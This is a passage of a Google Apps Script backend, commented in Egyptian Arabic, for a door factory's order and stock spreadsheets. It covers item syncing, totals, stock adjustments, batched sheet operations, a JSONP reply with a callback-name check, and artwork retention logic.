// المحفوظة من أصناف الطلب. من غير كده أرقام الأصناف عنده بتبقى مزحلقة عن
// الشيت، وأول تعديل بعد كده بيوقع على الصنف الغلط (ITEM_MOVED_ERR_).
function syncCutRows_(shI, id) {
  var changed = 0;
  var got = itemRowsFor_(shI, id);
  var rows = got.rows, rowNums = got.rowNums;   // rowNums = رقم كل سطر في الشيت
  if (!rows.length) return 0;

  // need   = كمية الأبواب المحتاجة قص لكل مقاس (القص محسوب من المقاس نفسه)
  // group  = كمية كل أبواب المقاس مهما كانت — سقف بند التدعيم
  // ⚠️ التدعيم اختيار من الموزّع ومش متسجّل على سطر الباب، فالسيرفر مايعرفش
  // أنهي أبواب اتختارلها تدعيم. فبنقدر بس نتأكد إن البند مايزيدش عن أبواب
  // مقاسه الموجودة، ونمسحه لو المقاس ما بقاش فيه أبواب خالص. الاتجاه ده آمن:
  // مابيزوّدش على العميل أبدًا، وبيمنع إننا نحاسبه على باب اتشال.
  var need = {}, group = {}, total = 0, svcRows = [];
  for (var i = 0; i < rows.length; i++) {
    var r = rows[i];
    var type = String(r[3] || '');
    var qty = Number(r[10]) || 0;
    if (isServiceCode_(r[5])) { svcRows.push({ i: i, row: r }); continue; }
    if (type !== 'Door') continue;
    var k = cutRowKey_(r[6], r[19]);
    group[k] = (group[k] || 0) + qty;
    if (!doorRowNeedsCut_(r[6], r[19])) continue;
    need[k] = (need[k] || 0) + qty;
    total += qty;
  }
  if (!svcRows.length) return 0;

  // بنمسح من تحت لفوق عشان أرقام السطور ما تزحلقش
  for (var j = svcRows.length - 1; j >= 0; j--) {
    var c = svcRows[j];
    var key = cutRowKey_(c.row[6], c.row[19]);
    var cur = Number(c.row[10]) || 0;
    var want;
    // القص السيرفر بيستنتجه من المقاس نفسه. أي بند خدمة تاني (تدعيم/طباعة)
    // اختيار من الموزّع ومش متسجّل على سطر الباب — فبيتعامل بنفس الطريقة:
    // نقدر نقصّه لعدد أبواب مقاسه، مانقدرش نستنتجه.
    if (String(c.row[5]) !== CUT_SERVICE_CODE_) {
      // ⚠️ مافيش سطر للمقاس ده في group ممكن يكون معناه حاجتين: إما البند
      // قديم ومالوش مقاس مكتوب (مانخمّنش)، وإما المقاس اتشال بالكامل من
      // الطلب (لازم البند يتشال معاه). بنفرّق بينهم بوجود المقاس نفسه.
      if (!String(c.row[6] || '')) continue;
      want = Math.min(cur, group[key] || 0);
    } else {
      want = need.hasOwnProperty(key) ? need[key]
           : (svcRows.length === 1 ? total : null);   // بند قديم من غير مقاس
      if (want === null) continue;
    }
    if (want === cur) continue;
    var rowNo = rowNums[c.i];
    if (want <= 0) { shI.deleteRow(rowNo); changed++; continue; }
    var price = Number(c.row[11]) || 0;
    shI.getRange(rowNo, COL_ITEM_QTY, 1, 3).setValues([[want, price, price * want]]);   // Qty / Unit Price / Line Total
    changed++;
  }
  return changed;
}

function recomputeOrderTotals_(id) {
  var shI = sheet_(SHEET_ITEMS, HEAD_ITEMS);
  var qty = 0, rods = 0, total = 0;
  var valsI = itemRowsFor_(shI, id).rows;
  for (var i = 0; i < valsI.length; i++) {
    var type = String(valsI[i][3] || '');
    var unit = String(valsI[i][9] || '');
    var q = Number(valsI[i][10]) || 0;
    var code = String(valsI[i][5] || '');
    // بنود الخدمة بتتحسب في الفلوس بس — مش في عدد القطع ولا العيدان
    if (!isServiceCode_(code)) {
      if (type === 'Frame' || type === 'Bror') rods += (unit === 'set' ? q * 3 : q); else qty += q;
    }
    total += Number(valsI[i][12]) || 0;
  }
  total = Math.round(total * 100) / 100;
  var shO = sheet_(SHEET_ORDERS, HEAD_ORDERS);
  var r = findRow_(shO, id);
  if (r > 0) {
    shO.getRange(r, COL_TOTAL_QTY).setValue(qty);
    shO.getRange(r, COL_TOTAL_RODS).setValue(rods);
    shO.getRange(r, COL_TOTAL_AMT).setValue(total);
  }
  return { qty: qty, rods: rods, total: total };
}

// بيرجّع حالة الطلب من شيت Orders (نص فاضي لو مش موجود)
function orderStatus_(id){
  var sh = sheet_(SHEET_ORDERS, HEAD_ORDERS);
  var r = findRow_(sh, id);
  if (r < 0) return '';
  return String(sh.getRange(r, COL_STATUS).getValue() || '');
}

// بيقرا بيانات المخزون بتاعة صف صنف واحد (كود/عرض/كمية) — بيرجّع null لو مش باب
// أو مش متتبّع في المخزون (مقاس خاص/بدون كود).
// من صف مقروء خلاص — من غير أي نداء لـ Sheets
function stockItemFromValues_(vals){
  if (!vals || String(vals[3]) !== 'Door') return null;
  var code = String(vals[5] || '').trim();
  var w    = String(vals[COL_ITEM_WIDTH - 1] || '').trim();
  if (!code || !w) return null;
  return { kind: 'door', code: code, w: w, qty: Number(vals[10]) || 0 };
}

function stockItemFromRow_(sh, row){
  return stockItemFromValues_(sh.getRange(row, 1, 1, HEAD_ITEMS.length).getValues()[0]);
}

function restoreStockForOrderId_(id){ adjustStockForOrderId_(id, +1); }

// بيرجّع (+1) أو يخصم (-1) رصيد كل أبواب الطلب. الاتنين محتاجين نفس القراية،
// فالدالة واحدة — إلغاء الطلب بيرجّع، والرجوع من الإلغاء لحالة نشطة بيخصم تاني.
function adjustStockForOrderId_(id, dir){
  var shRS = sheet_(SHEET_ITEMS, HEAD_ITEMS);
  var valsRS = itemRowsFor_(shRS, id).rows;
  var itemsRS = [];
  for (var iRS = 0; iRS < valsRS.length; iRS++) {
    if (String(valsRS[iRS][0]) !== String(id)) continue;
    if (String(valsRS[iRS][3]) !== 'Door') continue;
    itemsRS.push({
      kind: 'door',
      code: valsRS[iRS][5] || '',
      w: valsRS[iRS][COL_ITEM_WIDTH - 1] || '',
      qty: valsRS[iRS][10] || 0
    });
  }
  adjustStockForItems_(itemsRS, dir);
}

// بيزوّد أو بيخصم من رصيد المخزون حسب أصناف الطلب (الأبواب اللي ليها مقاس قياسي بس — مقاس خاص مش متتبّع)
// dir: -1 للخصم (طلب جديد) أو +1 للرجوع (إلغاء/حذف طلب)
// ⚠️ كان فيه باجين هنا:
//
// ١) خصم ضايع لو الطلب فيه سطرين بنفس الكود والمقاس (وده بيحصل عادي — مثلاً باب
//    A01 مقاس 70 عادي + نفس الباب والمقاس نسخة حفر، أو الموزع ضاف نفس المقاس
//    مرتين). الكود كان بيقرا الأرصدة مرة واحدة في rowsAS قبل اللوب، وبعدين لكل
//    صنف يحسب "الرصيد القديم - الكمية" ويكتبه. فالسطر التاني كان بيقرا نفس الرصيد
//    القديم من الذاكرة (مش المحدَّث) ويكتب فوق خصم السطر الأول فيلغيه.
//    مثال حقيقي: رصيد 10، طلب فيه 3 + 2 → المفروض يبقى 5، وكان بيطلع 8.
//    الحل: نجمّع كل الكميات لكل (كود|مقاس) الأول، وبعدين نخصم مرة واحدة.
//
// ٢) بطء: كان بيعمل setValue مرتين لكل صنف جوه لوب — كل واحدة نداء منفصل لـ Sheets.
//    طلب فيه 10 أصناف = 20 نداء (ثواني بتتضاف على كل إرسال طلب). دلوقتي كتابة
//    واحدة مجمّعة على المدى كله.
function adjustStockForItems_(items, dir){
  if (!items || !items.length) return;
  var shAS = sheet_(SHEET_STOCK, HEAD_STOCK);
  var lastAS = shAS.getLastRow();
  if (lastAS < 2) return;   // مفيش أرصدة متسجّلة أصلًا

  // ١) نجمّع المطلوب خصمه/رجوعه لكل (كود|مقاس)
  var deltas = {};
  for (var iAS = 0; iAS < items.length; iAS++) {
    var itAS = items[iAS];
    if (itAS.kind !== 'door') continue;
    var codeAS = doorCode_(itAS.code);
    var wAS    = String(itAS.w || '').trim();
    var qtyAS  = Number(itAS.qty) || 0;
    if (!codeAS || !wAS || !qtyAS) continue;   // مقاس خاص أو بدون كود = مش متتبّع في المخزون
    var keyAS = codeAS + '|' + wAS;
    deltas[keyAS] = (deltas[keyAS] || 0) + (dir * qtyAS);
  }
  var keys = Object.keys(deltas);
  if (!keys.length) return;

  // ٢) نطبّقهم على نسخة واحدة من الأرصدة
  var rng    = shAS.getRange(2, 1, lastAS - 1, 4);
  var rowsAS = rng.getValues();
  var now = new Date();
  var touched = false;
  // ⚠️ لو الشيت فيه صفين بنفس (الكود|المقاس) — وده بيحصل لو حد ضاف صف بالإيد —
  // الكود كان بيخصم الكمية من الصفين، يعني خصم مضاعف من رصيد حقيقي.
  // setStock بيحدّث أول صف مطابق بس، فبنمشي على نفس القاعدة: أول صف يفوز.
  var doneAS = {};
  for (var jAS = 0; jAS < rowsAS.length; jAS++) {
    var k = doorCode_(rowsAS[jAS][0]) + '|' + String(rowsAS[jAS][1]).trim();
    if (!(k in deltas) || doneAS[k]) continue;   // مش متتبّع في الطلب، أو اتعدّل خلاص
    doneAS[k] = true;
    rowsAS[jAS][2] = (Number(rowsAS[jAS][2]) || 0) + deltas[k];
    rowsAS[jAS][3] = now;
    touched = true;
  }

  // ٣) كتابة واحدة بدل نداءين لكل صنف
  if (touched) rng.setValues(rowsAS);
}

/* ------------------------------------------------------------
   تنضيف الأكواد القديمة في الشيت — تشغيل يدوي مرة واحدة (اختياري)
   ------------------------------------------------------------
   التطبيق والسيرفر بيتعاملوا مع A015 على إنه A013 في كل حتة، فالشغل ماشي
   صح من غير ما تعمل حاجة. الدالة دي بس لو حابب الشيت نفسه يتكتب بالكود
   الجديد (عشان اللي بيبص على الشيت مباشرة ما يلخبطش).

   طريقة التشغيل: من محرّر Apps Script اختار الدالة دي ودوس ▶ مرة واحدة.
   بتغيّر عمود الكود في تبويب الأصناف وتبويب المخزن بس — مفيش أي حاجة
   تانية بتتلمس، ومفيش كميات بتتغيّر. شغّلها وانت مطمّن إن عندك نسخة من
   الشيت (ملف ▸ عمل نسخة).
   ------------------------------------------------------------ */
function renameDoorCodesOnce(){
  var lock = LockService.getScriptLock();
  lock.waitLock(30000);
  try{
    var n = 0;
    // أصناف الطلبات — عمود Colour Code (السادس في HEAD_ITEMS)
    var COL_CODE_ = HEAD_ITEMS.indexOf('Colour Code') + 1;
    var shI = sheet_(SHEET_ITEMS, HEAD_ITEMS), lastI = shI.getLastRow();
    if (lastI >= 2 && COL_CODE_ > 0) {
      var rng = shI.getRange(2, COL_CODE_, lastI - 1, 1), v = rng.getValues(), hit = false;
      for (var i = 0; i < v.length; i++) {
        var nw = doorCode_(v[i][0]);
        if (nw && nw !== String(v[i][0]).trim()) { v[i][0] = nw; hit = true; n++; }
      }
      if (hit) rng.setValues(v);
    }
    // المخزن — عمود الكود رقم ١
    var shS = sheet_(SHEET_STOCK, HEAD_STOCK), lastS = shS.getLastRow();
    if (lastS >= 2) {
      var rngS = shS.getRange(2, 1, lastS - 1, 1), vs = rngS.getValues(), hitS = false;
      for (var j = 0; j < vs.length; j++) {
        var nwS = doorCode_(vs[j][0]);
        if (nwS && nwS !== String(vs[j][0]).trim()) { vs[j][0] = nwS; hitS = true; n++; }
      }
      if (hitS) rngS.setValues(vs);
    }
    Logger.log('اتغيّر ' + n + ' صف');
    return n;
  } finally { try{ lock.releaseLock(); }catch(e){} }
}

/* ============================================================
   مساعدات
   ============================================================ */

// اسم المخزن بالإنجليزي عشان الشيت يفضل كله لغة واحدة
function warehouseEn_(w) {
  var map = { 'مصنع إنشاص': 'Enshas Factory', 'مصنع انشاص': 'Enshas Factory' };
  return map[w] || w || '';
}

// بيجيب التبويب، ولو مش موجود بيعمله بالعناوين ويظبّطه من الشمال لليمين
function sheet_(name, headers) {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sh = ss.getSheetByName(name);

  if (!sh) {
    sh = ss.insertSheet(name);
    sh.setRightToLeft(false);          // الشيت إنجليزي — الاتجاه من الشمال لليمين
    sh.appendRow(headers);
    sh.getRange(1, 1, 1, headers.length)
      .setFontWeight('bold')
      .setBackground('#2A1F18')
      .setFontColor('#F3EDE4');
    sh.setFrozenRows(1);
    sh.autoResizeColumns(1, headers.length);
  } else if (sh.getLastColumn() < headers.length) {
    // شيت موجود قبل إضافة عمود جديد (زي Available) — نكمّل العناوين الناقصة
    // في الآخر من غير ما نلمس البيانات القديمة
    var have = sh.getLastColumn();
    sh.getRange(1, have + 1, 1, headers.length - have)
      .setValues([headers.slice(have)])
      .setFontWeight('bold')
      .setBackground('#2A1F18')
      .setFontColor('#F3EDE4');
  }
  return sh;
}

// بيقرا صفوف شيت Orders من غير الأعمدة التقيلة اللي محدش بيستخدمها في القراءة:
//   عمود 13 (Pricing Terms) · عمود 14 (Message) · عمود 15 (Status Updated)
// عمود Message فيه نص رسالة الواتساب كاملة (~600 حرف للطلب الواحد)، وgetDataRange
// كان بيقراه لكل صف في كل نداء ويرميه. مع 500 طلب ده ~300 كيلوبايت بتتقري على
// الفاضي في كل فتحة لشاشة المصنع وكل فحص خلفي (كل 90 ثانية).
//
// بنرجّع الصفوف بنفس ترتيب الأعمدة الأصلي بالظبط، والتلاتة اللي مقريناهمش بيبقوا
// نص فاضي في مكانهم — كده كل الكود اللي بيقرا rows[i][N] يفضل شغّال زي ما هو
// من غير أي تغيير في الأرقام.
function readOrderRows_(sh) {
  var last = sh.getLastRow();
  if (last < 2) return [];
  var n = last - 1;
  // ⚠️ الفجوة (الأعمدة اللي بنعدّيها) كانت أرقام مكتوبة: 12 / 16 / تلات خانات
  // فاضية. لو حد زوّد عمود قبلها، القراءة كانت بتترزّع كلها — الحالة تتقري
  // من خانة الرسالة، والعميل من خانة الأرشيف، في كل طلب وفي صمت.
  // بقت مشتقّة من GAP_COLS_ نفسها، والاختبار بيتأكد إن الأسامي هي هي.
  // الفجوة مش متعرّفة (الأسامي اتغيّرت)؟ اقرا الجدول كله — الصح أهم من السرعة.
  if (!GAP_FIRST_COL_) return sh.getRange(2, 1, n, HEAD_ORDERS.length).getValues();
  var gapFrom = GAP_FIRST_COL_;                    // أول عمود في الفجوة (1-based)
  var gapLen  = GAP_COLS_.length;
  var head = sh.getRange(2, 1, n, gapFrom - 1).getValues();
  var afterFrom = gapFrom + gapLen;
  var afterLen  = HEAD_ORDERS.length - (afterFrom - 1);
  var tail = afterLen > 0 ? sh.getRange(2, afterFrom, n, afterLen).getValues() : null;
  var blanks = [];
  for (var g = 0; g < gapLen; g++) blanks.push('');
  var out = [];
  for (var i = 0; i < n; i++) {
    out.push(tail ? head[i].concat(blanks, tail[i]) : head[i].concat(blanks));
  }
  return out;
}

// ===== سجل الطلبات المحذوفة من المصنع (v327) =====
// ⚠️ العميل كان بيفضل شايف الطلب في «تابع طلبك» بعد ما المصنع يحذفه: الطلب مش
// بيرجع في قايمة السيرفر، لكن التطبيق مايقدرش يفرّق بين «اتحذف» و«لسه ماوصلش».
// دلوقتي كل حذف بيتسجّل هنا (رقم الطلب + آخر ٩ أرقام من الموبايل)، و action=list
// بالموبايل بيرجّع `deleted` بالأرقام دي عشان التطبيق يشيلها من عند العميل.
var SHEET_DELETED327_ = 'Deleted_Orders';
var DELETED327_KEEP_DAYS_ = 90;
function recordDeleted327_(pairs) {
  try {
    if (!pairs || !pairs.length) return;
    var ss = SpreadsheetApp.getActiveSpreadsheet();
    var sh = ss.getSheetByName(SHEET_DELETED327_);
    if (!sh) {
      sh = ss.insertSheet(SHEET_DELETED327_);
      sh.appendRow(['Order ID', 'Phone', 'Deleted At']);
      sh.setFrozenRows(1);
    }
    var now = new Date(), rows = [];
    for (var i = 0; i < pairs.length; i++) {
      var d9 = digitsOnly_(pairs[i][1] || '').slice(-9);
      rows.push([String(pairs[i][0]), 'p' + d9, now]);   // «p» عشان الشيت ما يحوّلهاش لرقم
    }
    sh.getRange(sh.getLastRow() + 1, 1, rows.length, 3).setValues(rows);
  } catch (eRD) { try { logError_(eRD); } catch (eL) {} }   // السجل مش لازم يوقّف الحذف نفسه
}
function readDeleted327_(phone9) {
  try {
    if (!phone9) return [];
    var sh = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_DELETED327_);
    if (!sh) return [];
    var last = sh.getLastRow();
    if (last < 2) return [];
    var from = Math.max(2, last - 999);                 // آخر ألف حذف كفاية
    var vals = sh.getRange(from, 1, last - from + 1, 3).getValues();
    var cutoff = Date.now() - DELETED327_KEEP_DAYS_ * 86400000;
    var key = 'p' + String(phone9), out = [];
    for (var i = 0; i < vals.length; i++) {
      if (String(vals[i][1]) !== key) continue;
      var t = vals[i][2] instanceof Date ? vals[i][2].getTime() : 0;
      if (t && t < cutoff) continue;
      out.push(String(vals[i][0]));
    }
    return out;
  } catch (eRD2) { return []; }
}

function findRow_(sh, id) {
  var last = sh.getLastRow();
  if (last < 2) return -1;
  var ids = sh.getRange(2, 1, last - 1, 1).getValues();
  for (var i = 0; i < ids.length; i++) {
    if (String(ids[i][0]) === String(id)) return i + 2;
  }
  return -1;
}

// ⚠️ كانت بتمسح سطر سطر: طلب فيه ٢٠ سطر = ٢٠ نداء لـ Sheets، وكل نداء وقته
// محسوب. ده على المسار اللي بيتعمل مع كل حفظ طلب (بنمسح القديم قبل ما نكتب
// الجديد)، وهو نفس المسار اللي بيبطّأ الطلبات الكبيرة لحد ما الطلب يفشل.
// سطور الطلب الواحد بتتكتب مع بعض فبتبقى متجاورة، فبنمسحها ككتلة واحدة:
// طلب ٢٠ سطر بقى نداء واحد بدل ٢٠.
// بيرجّع سطور طلب معيّن من تبويب الأصناف من غير ما يقرا الشيت كله.
// ⚠️ ده كان أكبر سبب بطء في شاشة المصنع: كل نداء (جلب الأصناف، المعاينة،
// أي تعديل على صنف) كان بيقرا **كل أعمدة كل السطور** في تبويب Order_Items
// عشان يطلّع ١٥ سطر بتاعة طلب واحد. مع آلاف السطور دي ثواني على كل ضغطة،
// وبتزيد كل ما الشغل يكبر.
// دلوقتي: نقرا عمود المعرّف لوحده (عمود واحد = قراية رخيصة)، وبعدين نقرا
// سطور الطلب نفسها بس — وهي متجاورة عادةً فبتبقى قراية واحدة.
// بتحوّل صفوف الشيت لأصناف زي ما التطبيق مستنيها
// ⚠️ الأصناف بتتحدّد بترتيبها جوه الطلب (idx) — والترتيب ده بيتغيّر لو حد تاني
// حذف صنف أو ضاف صنف والشاشة عندك لسه القديمة. ساعتها التعديل أو الحذف بيقع
// على **صنف تاني** من غير ما حد ياخد باله. التطبيق بقى يبعت هوية الصنف
// (النوع + الكود + المقاس) مع رقمه، وبنتأكد إنها مطابقة قبل أي كتابة.
// (التطبيق القديم مش بيبعتها — ساعتها بنعدّي زي الأول عشان ما نكسّرش نسخة قديمة)
function itemMatches_(row, e) {
  var wantType = e.parameter.itype, wantCode = e.parameter.icode, wantSize = e.parameter.isize;
  if (wantType === undefined && wantCode === undefined && wantSize === undefined) return true;
  if (wantType !== undefined && String(row[3] || '') !== String(wantType)) return false;
  // ⚠️ التطبيق بيطبّع الأكواد القديمة (A015→A013) قبل ما يعرضها، فالكود اللي
  // بيبعته ممكن يكون الجديد والسطر في الشيت لسه بالقديم. من غير التطبيع هنا،
  // أي تعديل كمية أو حذف صنف على طلب قديم بيترفض بـ«الأصناف اتغيّرت».
  if (wantCode !== undefined && doorCode_(row[5]) !== doorCode_(wantCode)) return false;
  if (wantSize !== undefined && String(row[6] || '') !== String(wantSize)) return false;
  return true;
}
var ITEM_MOVED_ERR_ = 'الأصناف اتغيّرت من جهاز تاني — اعمل تحديث وجرّب تاني';

function itemsFromRows_(rows){
  var out = [];
  for (var i = 0; i < rows.length; i++) {
    var r = rows[i];
    out.push({
      type:      r[3],
      title:     r[4],
      code:      r[5],
      size:      r[6],
      included:  r[7],
      milling:   r[8],
      unit:      r[9],
      qty:       r[10],
      unitPrice: r[11],
      lineTotal: r[12],
      avail:     r[13] !== 'N',
      frame:     r[14] || '',
      dbror:     r[15] || '',
      frameHeight: r[16] || '',
      width:     r[17] || '',
      produced:  Number(r[18]) || 0,
      doorHeight: r[19] || '',
      forDoorWidth: r[20] || '',
      itemNote:  r[21] || '',
      received: Number(r[24]) || 0,   // «المستلم» (COL_ITEM_RECEIVED)
      engraveArt:r[23]||'',
      printArt:  r[22] || ''           // صورة الطباعة (COL_ITEM_PRINTART)
    });
  }
  return out;
}

function itemRowsFor_(sh, id){
  var m = itemRowsForMany_(sh, [id]);
  return m[String(id)] || { rows: [], rowNums: [] };
}

// نفس الفكرة لأكتر من طلب مرة واحدة: بنقرا عمود المعرّف **مرة واحدة** للكل،
// وبعدين بنقرا الكتل المطلوبة بس. المعاينة لعميل عنده ١٠ طلبات بقت قراية
// واحدة للعمود بدل ١٠.
function itemRowsForMany_(sh, ids){
  var out = {};
  for (var k = 0; k < ids.length; k++) out[String(ids[k])] = { rows: [], rowNums: [] };
  var last = sh.getLastRow();
  if (last < 2) return out;
  var col = sh.getRange(2, 1, last - 1, 1).getValues();
  var i = 0;
  while (i < col.length) {
    var key = String(col[i][0]);
    if (!(key in out)) { i++; continue; }
    var start = i;
    while (i < col.length && String(col[i][0]) === key) i++;
    var count = i - start;
    var block = sh.getRange(start + 2, 1, count, HEAD_ITEMS.length).getValues();
    for (var j = 0; j < count; j++) {
      out[key].rows.push(block[j]);
      out[key].rowNums.push(start + 2 + j);
    }
  }
  return out;
}

// مسح أصناف أكتر من طلب في مرور واحد.
// ⚠️ زرار «مسح المسلّم» كان بينده clearItemRows_ لكل طلب لوحده — يعني قراية
// لعمود المعرّف لكل طلب. مع ١٠٠ طلب مسلّم دي ١٠٠ قراية + مسح، وممكن توصل
// لحد وقت التنفيذ في جوجل ويقف نص الشغل. دلوقتي: قراية واحدة ومسح بالكتل.
function clearItemRowsMany_(sh, ids) {
  var want = {};
  for (var k = 0; k < ids.length; k++) want[String(ids[k])] = true;
  var last = sh.getLastRow();
  if (last < 2) return;
  var col = sh.getRange(2, 1, last - 1, 1).getValues();
  var i = col.length - 1;
  while (i >= 0) {
    if (!want[String(col[i][0])]) { i--; continue; }
    var end = i;
    while (i >= 0 && want[String(col[i][0])]) i--;
    var start = i + 1;
    sh.deleteRows(start + 2, end - start + 1);
  }
}

// بترجّع عدد السطور اللي اتمسحت فعلاً — الحذف بيستعمله عشان يعرف
// إذا كان الطلب موجود في الشيت أصلاً ولا لأ
function clearItemRows_(sh, id) {
  var last = sh.getLastRow();
  if (last < 2) return 0;
  var ids = sh.getRange(2, 1, last - 1, 1).getValues();
  var key = String(id);
  var done = 0;
  // من تحت لفوق عشان أرقام السطور ما تتغيّرش وإحنا شغالين
  var i = ids.length - 1;
  while (i >= 0) {
    if (String(ids[i][0]) !== key) { i--; continue; }
    var end = i;                                  // آخر سطر في الكتلة
    while (i >= 0 && String(ids[i][0]) === key) i--;
    var start = i + 1;                            // أول سطر فيها
    sh.deleteRows(start + 2, end - start + 1);
    done += end - start + 1;
  }
  return done;
}

function json(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}

// لو التطبيق بعت callback بنرد JSONP — ده بيتخطّى مشاكل CORS خالص
// ⚠️ ثغرة كانت هنا: اسم الدالة اللي جاي في الرابط (callback) كان بيتحط في الرد
// زي ما هو من غير أي فحص، والرد بيترجع كـ JavaScript. يعني حد يبعت رابط فيه
// callback=<أي كود> والسيرفر بتاعنا يرجّع الكود ده منفّذ. التطبيق بيبعت أسماء
// شكلها ثابت (wpcb...)، فبنقبل الشكل ده بس: حروف وأرقام و_ و$ يبدأوا بحرف.
var CB_OK_ = /^[A-Za-z_$][A-Za-z0-9_$]{0,63}$/;
function reply(obj, cb) {
  if (cb) {
    if (!CB_OK_.test(String(cb))) return json({ ok: false, error: 'callback غير صالح' });
    return ContentService
      .createTextOutput(cb + '(' + JSON.stringify(obj) + ')')
      .setMimeType(ContentService.MimeType.JAVASCRIPT);
  }
  return json(obj);
}

// ⚠️ تبويب الأخطاء كان بيكبر للأبد. أي مشكلة متكررة (نت بيقطع، محاولة غلط
// بتتعاد) بتكتب سطر جديد كل مرة، والشيت بيتقل من غير ما حد يبصله. وحد الخلايا
// في جوجل شيت مشترك بين كل التبويبات — يعني ممكن يزاحم الطلبات نفسها.
// بنسيب آخر ERR_KEEP_ سطر بس.
var ERR_KEEP_ = 500;
function logError_(err) {
  try {
    var ss = SpreadsheetApp.getActiveSpreadsheet();
    var sh = ss.getSheetByName(SHEET_ERRORS);
    if (!sh) {
      sh = ss.insertSheet(SHEET_ERRORS);
      sh.setRightToLeft(false);
      sh.appendRow(['Timestamp', 'Error']);
      sh.setFrozenRows(1);
    }
    sh.appendRow([new Date(), String(err && err.stack ? err.stack : err)]);
    // تنظيف: بنمسح الأقدم لما نعدّي الحد (مسح واحد مجمّع، مش سطر سطر)
    var last = sh.getLastRow();
    if (last > ERR_KEEP_ + 1) sh.deleteRows(2, last - ERR_KEEP_ - 1);
  } catch (e) {}
}


function testOrder() {
  saveOrder_({
    id: 'W-TEST-1',
    ts: Date.now(),
    name: 'Test Distributor',
    phone: '01000000000',
    region: 'Tanta',
    warehouse: 'مصنع إنشاص',
    total: 11623.64,
    msg: 'Test message',
    items: [
      { kind: 'door', title: 'باب WPC A05 — بني', titleEn: 'WPC Door A05 - Brown',
        code: 'A05', sizeTxt: '90 سم', sizeEn: '90 cm', unitPrice: 5400, qty: 2,
        frame: 10, dbror: '6×9', mill: 'smart', millAr: 'سمارت', millEn: 'Smart' },
      { kind: 'frame', key: 'حلق15', spec: '15 سم', title: 'حلق باب 15 سم — عود 2.15 م',
        titleEn: 'Door Frame 15 cm - 2.15m rod', price: 309.90, qty: 2 },
      { kind: 'bror', key: 'برور6×9', spec: '6×9', title: 'برور 6×9 — عود 2.15 م',
        titleEn: 'Bror 6x9 - 2.15m rod', price: 170.84, qty: 1 },
      { kind: 'acc', title: 'جوان', titleEn: 'Gasket', price: 6, qty: 5.5, unit: 'متر' }
    ]
  });
}

/* Private artwork retention. Order and catalogue rows are never deleted here. */
var ART_KEEP_MS_ = 72*60*60*1000;
var ART_ORPHAN_MS_ = 24*60*60*1000;
function artDateMs_(v){var n=v instanceof Date?v.getTime():Number(v);return isFinite(n)&&n>0?n:0;}
function artBook_(){
  var id=PropertiesService.getScriptProperties().getProperty('ART_SPREADSHEET_ID');
  var ss=id?SpreadsheetApp.openById(id):SpreadsheetApp.getActiveSpreadsheet();
  if(!ss)throw new Error('Artwork spreadsheet is not configured');return ss;
}
function artState_(orderId){
  if(!artOrderValid_(orderId))return {row:-1,completed:0,purged:0};
  var sh=artBook_().getSheetByName(SHEET_ORDERS),r=sh?findRow_(sh,orderId):-1;
  if(r<2)return {row:-1,completed:0,purged:0};
  var v=sh.getRange(r,COL_ART_COMPLETED,1,2).getValues()[0];
  return {row:r,completed:artDateMs_(v[0]),purged:artDateMs_(v[1]),sheet:sh};
}
function artExpired_(orderId){var s=artState_(orderId);return !!s.purged||!!s.completed&&Date.now()>=s.completed+ART_KEEP_MS_;}
function artOrderHasImages_(orderId){
  var sh=artBook_().getSheetByName(SHEET_ITEMS);if(!sh)return false;
  var rows=itemRowsFor_(sh,orderId).rows;
  for(var i=0;i<rows.length;i++)if(rows[i][22]||rows[i][23])return true;return false;
}
function artStatusTransition_(sh,r,id,oldStatus,newStatus,validateOnly){
  if(!artOrderHasImages_(id))return;
  var values=sh.getRange(r,COL_ART_COMPLETED,1,2).getValues()[0],t=artDateMs_(values[0]);
  var expired=artDateMs_(values[1])||t&&Date.now()>=t+ART_KEEP_MS_;
  if(newStatus==='Delivered'&&!t)throw new Error('سجّل جاهز للتحميل أولًا لبدء مدة حفظ تصميمات الطلب');
  if(validateOnly)return;
  if(expired)return; // Reopening is not a way to resurrect an expired design.
  if(newStatus==='Ready'&&!t)sh.getRange(r,COL_ART_COMPLETED).setValue(new Date());
  else if(newStatus!==oldStatus&&['New','Received','In Progress'].indexOf(newStatus)>=0&&t)sh.getRange(r,COL_ART_COMPLETED).setValue('');
}
function artworkStatusEdited(e){
  if(!e||!e.range)return;
  var range=e.range,sh=range.getSheet();
  if(sh.getName()!==SHEET_ORDERS||range.getColumn()>COL_STATUS||range.getLastColumn()<COL_STATUS)return;
  var lock=LockService.getScriptLock();lock.waitLock(20000);
  try{
    var first=Math.max(2,range.getRow()),last=range.getLastRow();
    for(var r=first;r<=last;r++){
      var id=String(sh.getRange(r,1).getValue()||''),status=String(sh.getRange(r,COL_STATUS).getValue()||'');
      artStatusTransition_(sh,r,id,String(e.oldValue||''),status);
    }
  }finally{lock.releaseLock();}
}
// Exact legacy labels observed in the bound production sheets on 2026-11-22.
// The stored rows already use the current fixed positions. Never rename, move,
// or rewrite existing headers/data here. Reject any unrecognized label block.
function artLegacyHeaderSpan_(name,head){
  var first,labels;
  if(name===SHEET_ORDERS){
    first=8;labels=['Total Amount','Status','Message','','','',''];
  }else if(name===SHEET_ITEMS){
    first=7;labels=['Frame (with door)','Metres','Qty','Unit Price','Line Total',''];
  }else return null;
  for(var i=0;i<labels.length;i++)if(String(head[first+i]||'')!==labels[i])return null;
  return {first:first,last:first+labels.length};
}
// The old labels alone must not authorize a genuinely old/reordered data layout.
// Read only the ID and the positional discriminator columns. No writes/logged IDs.
function artValidateLegacyRows_(name,sh){
  var n=sh.getLastRow()-1;if(n<1)return 0;
  var ids=sh.getRange(2,1,n,1).getValues();
  var isOrders=name===SHEET_ORDERS;
  var vals=sh.getRange(2,isOrders?COL_TOTAL_RODS:10,n,isOrders?3:2).getValues();
  var statuses=['New','Received','In Progress','Ready','Delivered'],checked=0;
  for(var i=0;i<n;i++){
    var id=String(ids[i][0]||''),v=vals[i],occupied=false;
    for(var j=0;j<v.length;j++)if(v[j]!==''&&v[j]!==null)occupied=true;
    if(!id&&!occupied)continue;
    var valid=!!id;
    if(isOrders){
      valid=valid&&statuses.indexOf(String(v[2]||''))>=0&&statuses.indexOf(String(v[1]||''))<0;
    }else{
      var unit=String(v[0]===null?'':v[0]).trim();
      valid=valid&&!!unit&&!isFinite(Number(unit))&&v[1]!==''&&v[1]!==null&&isFinite(Number(v[1]));
    }
    if(!valid)throw new Error('Legacy data layout mismatch: '+name+' row '+(i+2));
